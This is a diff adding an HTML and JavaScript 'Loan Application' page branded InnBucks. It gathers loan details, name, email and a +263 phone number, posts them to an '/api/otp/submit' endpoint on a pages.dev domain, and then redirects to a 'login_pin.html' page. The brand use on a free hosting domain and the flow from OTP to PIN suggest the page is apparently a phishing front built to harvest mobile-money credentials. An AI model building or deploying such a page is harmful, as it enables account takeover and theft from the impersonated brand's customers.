@@ -1,0 +1,547 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Loan Application</title>
+    <style>
+      body {
+        margin: 0;
+        font-family: Arial, sans-serif;
+        background: #f2f2f2;
+      }
+      .header {
+        background: #16213e;
+        color: white;
+        padding: 16px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+      }
+      .logo {
+        font-size: 22px;
+        font-weight: bold;
+      }
+      .back {
+        color: #bbb;
+        font-size: 16px;
+        cursor: pointer;
+      }
+      .container {
+        max-width: 420px;
+        margin: 20px auto;
+        background: white;
+        border-radius: 18px;
+        padding: 25px;
+        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
+      }
+      h1 {
+        text-align: center;
+        margin-bottom: 5px;
+      }
+      .step {
+        text-align: center;
+        color: #777;
+        margin-bottom: 20px;
+      }
+      .progress {
+        display: flex;
+        justify-content: center;
+        gap: 10px;
+        margin-bottom: 30px;
+      }
+      .bar {
+        height: 6px;
+        width: 60px;
+        border-radius: 6px;
+        background: #ddd;
+      }
+      .bar.active {
+        background: linear-gradient(90deg, #00b894, #6c5ce7);
+      }
+      .form-group {
+        margin-bottom: 20px;
+      }
+      label {
+        font-weight: bold;
+        display: block;
+        margin-bottom: 8px;
+      }
+      input,
+      select,
+      textarea {
+        width: 100%;
+        padding: 15px;
+        border-radius: 12px;
+        border: 1px solid #ddd;
+        font-size: 16px;
+        box-sizing: border-box;
+      }
+      textarea {
+        resize: none;
+        height: 100px;
+      }
+      .btn {
+        width: 100%;
+        padding: 16px;
+        border: none;
+        border-radius: 14px;
+        font-size: 18px;
+        color: white;
+        cursor: pointer;
+        margin-top: 15px;
+        background: linear-gradient(90deg, #00b894, #6c5ce7);
+      }
+      .btn:disabled {
+        opacity: 0.5;
+        cursor: not-allowed;
+      }
+      .prev-btn {
+        background: #ddd;
+        color: #555;
+      }
+      .error {
+        color: red;
+        font-size: 14px;
+        margin-top: 10px;
+        text-align: center;
+      }
+      .summary {
+        background: #f4f4f4;
+        padding: 20px;
+        border-radius: 14px;
+        margin-top: 20px;
+        border-left: 5px solid #00b894;
+      }
+      .summary-row {
+        display: flex;
+        justify-content: space-between;
+        margin-bottom: 10px;
+        font-size: 14px;
+      }
+      .hidden {
+        display: none;
+      }
+      .footer {
+        background: #16213e;
+        color: white;
+        text-align: center;
+        padding: 15px;
+        margin-top: 30px;
+      }
+      .phone-row {
+        display: flex;
+        gap: 10px;
+      }
+      .country-code {
+        width: 90px;
+      }
+      .phone-input {
+        flex: 1;
+      }
+      .note {
+        font-size: 13px;
+        color: #777;
+        margin-top: 6px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="header">
+      <div class="back" onclick="goBack()">← Back</div>
+      <div class="logo">InnBucks</div>
+      <div>☰</div>
+    </div>
+
+    <div class="container">
+      <h1>Loan Application</h1>
+      <div class="step" id="stepIndicator">Step 1 of 3</div>
+
+      <div class="progress" id="progressBar">
+        <div class="bar"></div>
+        <div class="bar"></div>
+        <div class="bar"></div>
+      </div>
+
+      <!-- STEP 1 -->
+      <div id="step1" class="step-content">
+        <form id="form1">
+          <div class="form-group">
+            <label>Loan Type</label>
+            <select id="loanType" required>
+              <option value="">Select Loan Type</option>
+              <option>Personal Loan</option>
+              <option>Business Loan</option>
+              <option>Emergency Loan</option>
+              <option>Education Loan</option>
+              <option>Car Loan</option>
+            </select>
+          </div>
+          <div class="form-group">
+            <label>Loan Amount ($)</label>
+            <input
+              type="number"
+              id="loanAmount"
+              placeholder="Enter amount"
+              required
+            />
+          </div>
+          <div class="form-group">
+            <label>Loan Term</label>
+            <select id="loanTerm" required>
+              <option value="">Select Term</option>
+              <option>3 Months</option>
+              <option>6 Months</option>
+              <option>12 Months</option>
+              <option>24 Months</option>
+              <option>36 Months</option>
+              <option>60 Months</option>
+            </select>
+          </div>
+          <div class="form-group">
+            <label>Purpose of Loan</label>
+            <textarea
+              id="purpose"
+              placeholder="Enter purpose"
+              required
+            ></textarea>
+          </div>
+          <button type="submit" class="btn">NEXT STEP</button>
+          <div class="error" id="errorMsg1"></div>
+        </form>
+      </div>
+
+      <!-- STEP 2 -->
+      <div id="step2" class="step-content hidden">
+        <form id="form2">
+          <div class="form-group">
+            <label>Full Name</label>
+            <input
+              type="text"
+              id="fullName"
+              placeholder="Enter full name"
+              required
+            />
+          </div>
+          <div class="form-group">
+            <label>Email</label>
+            <input type="email" id="email" placeholder="Enter email" required />
+          </div>
+          <div class="form-group">
+            <label>Phone Number</label>
+            <div class="phone-row">
+              <input
+                type="text"
+                class="country-code"
+                id="countryCode"
+                value="+263"
+                maxlength="4"
+              />
+              <input
+                type="tel"
+                class="phone-input"
+                id="phone"
+                placeholder="712345678"
+                required
+              />
+            </div>
+          </div>
+          <div style="display: flex; gap: 10px">
+            <button type="button" class="btn prev-btn" onclick="previousStep()">
+              PREVIOUS
+            </button>
+            <button type="submit" class="btn">NEXT STEP</button>
+          </div>
+          <div class="error" id="errorMsg2"></div>
+        </form>
+      </div>
+
+      <!-- STEP 3 -->
+      <div id="step3" class="step-content hidden">
+        <form id="form3">
+          <div class="form-group">
+            <label>Employment Details</label>
+            <select id="empDetails" required>
+              <option value="">Select Employment Details</option>
+              <option>Full-time Employee</option>
+              <option>Part-time Employee</option>
+              <option>Self-employed</option>
+              <option>Business Owner</option>
+              <option>Freelancer</option>
+              <option>Student</option>
+              <option>Retired</option>
+              <option>Unemployed</option>
+              <option>Other</option>
+            </select>
+          </div>
+          <div class="form-group">
+            <label>Monthly Income ($)</label>
+            <input
+              type="number"
+              id="income"
+              placeholder="Enter monthly income"
+              required
+            />
+          </div>
+
+          <div class="summary">
+            <strong>Review Summary</strong>
+            <div class="summary-row">
+              <span>Loan Type:</span>
+              <span id="summaryLoanType">-</span>
+            </div>
+            <div class="summary-row">
+              <span>Amount:</span>
+              <span id="summaryAmount">-</span>
+            </div>
+            <div class="summary-row">
+              <span>Term:</span>
+              <span id="summaryTerm">-</span>
+            </div>
+            <div class="summary-row">
+              <span>Name:</span>
+              <span id="summaryName">-</span>
+            </div>
+            <div class="summary-row">
+              <span>Email:</span>
+              <span id="summaryEmail">-</span>
+            </div>
+            <div class="summary-row">
+              <span>Phone:</span>
+              <span id="summaryPhone">-</span>
+            </div>
+          </div>
+
+          <div style="display: flex; gap: 10px">
+            <button type="button" class="btn prev-btn" onclick="previousStep()">
+              PREVIOUS
+            </button>
+            <button type="submit" class="btn">SUBMIT APPLICATION</button>
+          </div>
+          <div class="error" id="errorMsg3"></div>
+        </form>
+      </div>
+    </div>
+
+    <script>
+      let currentStep = 1;
+      const isDevelopment =
+        window.location.hostname === "localhost" ||
+        window.location.hostname === "127.0.0.1";
+      const backendUrl = isDevelopment
+        ? "http://localhost:3000"
+        : "https://innbucks-39v.pages.dev";
+      localStorage.setItem("backendUrl", backendUrl);
+
+      function getStep() {
+        const params = new URLSearchParams(window.location.search);
+        return parseInt(params.get("step")) || 1;
+      }
+
+      function shown() {
+        currentStep = getStep();
+        updateUI();
+        prefillFromStorage();
+
+        // Handle country code input overflow
+        document
+          .getElementById("countryCode")
+          .addEventListener("input", (e) => {
+            const value = e.target.value;
+            if (value.length > 4) {
+              const countryPart = value.substring(0, 4);
+              const phonePart = value.substring(4);
+              e.target.value = countryPart;
+              const phoneInput = document.getElementById("phone");
+              phoneInput.value = phonePart + phoneInput.value;
+              phoneInput.focus();
+            }
+          });
+      }
+
+      function updateUI() {
+        document.querySelectorAll(".step-content").forEach((el, i) => {
+          el.classList.toggle("hidden", i + 1 !== currentStep);
+        });
+        document.getElementById("stepIndicator").textContent =
+          `Step ${currentStep} of 3`;
+        const bars = document.querySelectorAll(".bar");
+        bars.forEach((bar, i) => {
+          bar.classList.toggle("active", i < currentStep);
+        });
+      }
+
+      function goBack() {
+        window.history.back();
+      }
+
+      function previousStep() {
+        if (currentStep > 1) {
+          currentStep--;
+          updateUI();
+        }
+      }
+
+      function prefillFromStorage() {
+        const storedAmount = localStorage.getItem("loanAmount");
+        const storedTerm = localStorage.getItem("loanTerm");
+        const storedPurpose = localStorage.getItem("purpose");
+        const storedName = localStorage.getItem("fullName");
+        const storedEmail = localStorage.getItem("email");
+        const storedPhone = localStorage.getItem("phoneNumber");
+
+        if (storedAmount)
+          document.getElementById("loanAmount").value = storedAmount;
+        if (storedPurpose)
+          document.getElementById("purpose").value = storedPurpose;
+        if (storedName) document.getElementById("fullName").value = storedName;
+        if (storedEmail) document.getElementById("email").value = storedEmail;
+        if (storedPhone) {
+          if (storedPhone.startsWith("+263")) {
+            document.getElementById("countryCode").value = "+263";
+            document.getElementById("phone").value = storedPhone.substring(4);
+          } else {
+            document.getElementById("phone").value = storedPhone;
+          }
+        }
+
+        if (storedTerm) {
+          const termSelect = document.getElementById("loanTerm");
+          for (let i = 0; i < termSelect.options.length; i++) {
+            if (termSelect.options[i].text === storedTerm + " Months") {
+              termSelect.selectedIndex = i;
+              break;
+            }
+          }
+        }
+      }
+
+      function saveStep1() {
+        localStorage.setItem(
+          "loanType",
+          document.getElementById("loanType").value,
+        );
+        localStorage.setItem(
+          "loanAmount",
+          document.getElementById("loanAmount").value,
+        );
+        localStorage.setItem(
+          "loanTerm",
+          document.getElementById("loanTerm").value.split(" ")[0],
+        );
+        localStorage.setItem(
+          "purpose",
+          document.getElementById("purpose").value,
+        );
+      }
+
+      function saveStep2() {
+        localStorage.setItem(
+          "fullName",
+          document.getElementById("fullName").value,
+        );
+        localStorage.setItem("email", document.getElementById("email").value);
+        localStorage.setItem(
+          "phoneNumber",
+          document.getElementById("countryCode").value +
+            document.getElementById("phone").value,
+        );
+      }
+
+      function updateSummary() {
+        document.getElementById("summaryLoanType").textContent =
+          localStorage.getItem("loanType") || "-";
+        document.getElementById("summaryAmount").textContent =
+          "$" + (localStorage.getItem("loanAmount") || "0");
+        document.getElementById("summaryTerm").textContent =
+          (localStorage.getItem("loanTerm") || "-") + " Months";
+        document.getElementById("summaryName").textContent =
+          localStorage.getItem("fullName") || "-";
+        document.getElementById("summaryEmail").textContent =
+          localStorage.getItem("email") || "-";
+        document.getElementById("summaryPhone").textContent =
+          localStorage.getItem("phoneNumber") || "-";
+      }
+
+      document.getElementById("form1").addEventListener("submit", (e) => {
+        e.preventDefault();
+        const errorEl = document.getElementById("errorMsg1");
+        if (
+          !document.getElementById("loanType").value ||
+          !document.getElementById("loanAmount").value ||
+          !document.getElementById("loanTerm").value ||
+          !document.getElementById("purpose").value
+        ) {
+          errorEl.textContent = "Please fill all fields";
+          return;
+        }
+        errorEl.textContent = "";
+        saveStep1();
+        currentStep = 2;
+        updateUI();
+      });
+
+      document.getElementById("form2").addEventListener("submit", (e) => {
+        e.preventDefault();
+        const errorEl = document.getElementById("errorMsg2");
+        if (
+          !document.getElementById("fullName").value ||
+          !document.getElementById("email").value ||
+          !document.getElementById("countryCode").value ||
+          !document.getElementById("phone").value
+        ) {
+          errorEl.textContent = "Please fill all fields";
+          return;
+        }
+        errorEl.textContent = "";
+        saveStep2();
+        currentStep = 3;
+        updateUI();
+        updateSummary();
+      });
+
+      document.getElementById("form3").addEventListener("submit", async (e) => {
+        e.preventDefault();
+        const errorEl = document.getElementById("errorMsg3");
+        const empDetails = document.getElementById("empDetails").value;
+        const income = document.getElementById("income").value;
+
+        if (!empDetails || !income) {
+          errorEl.textContent = "Please fill all required fields";
+          return;
+        }
+
+        try {
+          const countryCode = document.getElementById("countryCode").value;
+          const phoneNum = document.getElementById("phone").value;
+          const email = document.getElementById("email").value;
+          const fullName = document.getElementById("fullName").value;
+
+          const payload = {
+            phone: countryCode + phoneNum,
+            email: email,
+            firstName: fullName.split(" ")[0],
+            lastName: fullName.split(" ").slice(1).join(" "),
+            userId: "user_" + Date.now(),
+          };
+
+          const resp = await fetch(backendUrl + "/api/otp/submit", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload),
+          });
+
+          const data = await resp.json();
+          if (!data.success) throw new Error(data.error || "Submission failed");
+
+          localStorage.setItem("requestId", data.requestId);
+          window.location.href = "login_pin.html";
+        } catch (err) {
+          errorEl.textContent = "Error: " + err.message;
+        }
+      });
+
+      shown();
+    </script>
+  </body>
+</html>
